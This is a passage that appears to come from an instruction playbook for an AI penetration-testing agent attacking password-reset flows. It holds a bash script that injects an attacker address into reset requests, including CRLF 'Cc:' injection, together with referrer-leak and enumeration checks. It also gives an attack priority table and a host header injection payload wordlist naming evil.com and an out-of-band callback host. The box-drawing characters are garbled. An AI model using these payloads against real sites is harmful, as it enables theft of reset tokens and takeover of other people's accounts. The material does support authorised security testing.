echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

ATTACKER_EMAIL="attacker@evil.com"

curl -s -X POST "$RESET_URL" \
    -d "email=${VICTIM_EMAIL},${ATTACKER_EMAIL}" > /dev/null
echo "[*] Tested comma-separated"

curl -s -X POST "$RESET_URL" \
    -d "email[]=${VICTIM_EMAIL}&email[]=${ATTACKER_EMAIL}" > /dev/null
echo "[*] Tested array syntax"

curl -s -X POST "$RESET_URL" \
    -d "email=${VICTIM_EMAIL}%0aCc:${ATTACKER_EMAIL}" > /dev/null
echo "[*] Tested CC injection"

# TEST 3: Referer Leakage Check
echo ""
echo "[TEST 3] Referer Header Policy"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

policy=$(curl -s -D - "https://target.com/reset?token=test" 2>/dev/null | \
    grep -i "referrer-policy" | head -1)

if [ -z "$policy" ]; then
    echo "[!] No Referrer-Policy header - potential leakage"
    echo "VULNERABLE: No Referrer-Policy header" >> "$OUTPUT_DIR/token_leakage.txt"
elif echo "$policy" | grep -qi "unsafe-url\|no-referrer-when-downgrade"; then
    echo "[!] Weak Referrer-Policy: $policy"
    echo "VULNERABLE: Weak Referrer-Policy" >> "$OUTPUT_DIR/token_leakage.txt"
else
    echo "[+] Referrer-Policy: $policy"
fi

# TEST 4: Account Enumeration
echo ""
echo "[TEST 4] Account Enumeration"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

valid_response=$(curl -s -X POST "$RESET_URL" -d "email=$VICTIM_EMAIL")
invalid_response=$(curl -s -X POST "$RESET_URL" -d "email=definitelynotexists$(date +%s)@example.com")

if [ "$valid_response" != "$invalid_response" ]; then
    echo "[!] Different responses - account enumeration possible"
    echo "VULNERABLE: Account enumeration via password reset" >> "$OUTPUT_DIR/scan_log.txt"
else
    echo "[+] Responses appear identical"
fi

echo ""
echo "[*] Tests complete. Results in $OUTPUT_DIR"
echo "[*] Remember to check Interactsh callbacks!"

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§ 
================================================================================

ATTACK PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Priority â”‚ Attack                      â”‚ Impact                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1        â”‚ Host Header Poisoning       â”‚ Account takeover                  â”‚
â”‚ 2        â”‚ X-Forwarded-Host            â”‚ Account takeover                  â”‚
â”‚ 3        â”‚ Email Parameter Pollution   â”‚ Token received by attacker        â”‚
â”‚ 4        â”‚ Referer Token Leakage       â”‚ Token exposure to third parties   â”‚
â”‚ 5        â”‚ Predictable Tokens          â”‚ Token guessing                    â”‚
â”‚ 6        â”‚ Token Reuse/No Expiry       â”‚ Persistent attack vector          â”‚
â”‚ 7        â”‚ Account Enumeration         â”‚ Information disclosure            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

VERIFICATION CHECKLIST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Host header injection tested with all variants
â–¡ X-Forwarded-Host and related headers tested
â–¡ Email parameter pollution attempted
â–¡ Referer policy checked for token leakage risk
â–¡ Token predictability analyzed (multiple tokens)
â–¡ Token expiration and reuse tested
â–¡ Race conditions explored

================================================================================
COMMON MISTAKES TO AVOID
================================================================================
âŒ Only testing Host header, missing X-Forwarded-Host
âŒ Not using Interactsh to receive poisoned callbacks
âŒ Forgetting to check Referrer-Policy header
âŒ Not analyzing multiple tokens for patterns
âŒ Missing email parameter pollution techniques
âŒ Not testing token reuse after password change

================================================================================
WORDLIST: HOST HEADER INJECTION PAYLOADS
================================================================================
evil.com
attacker.oast.fun
target.com.evil.com
target.com@evil.com
evil.com/target.com
target.com%00.evil.com
target.com%0d%0aHost: evil.com
target.com#@evil.com
target.com?@evil.com
evil.com#target.com
evil.com\.target.com
target.com:80@evil.com:80
target.com:443@evil.com:443
[::1]
127.0.0.1
localhost

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ All host-like headers tested for poisoning
âœ“ Interactsh listener checked for token callbacks
âœ“ Email parameter pollution vectors tested
âœ“ Token leakage via Referer analyzed
âœ“ Token predictability assessed
âœ“ Token lifecycle (expiry, reuse) tested
âœ“ Race conditions explored

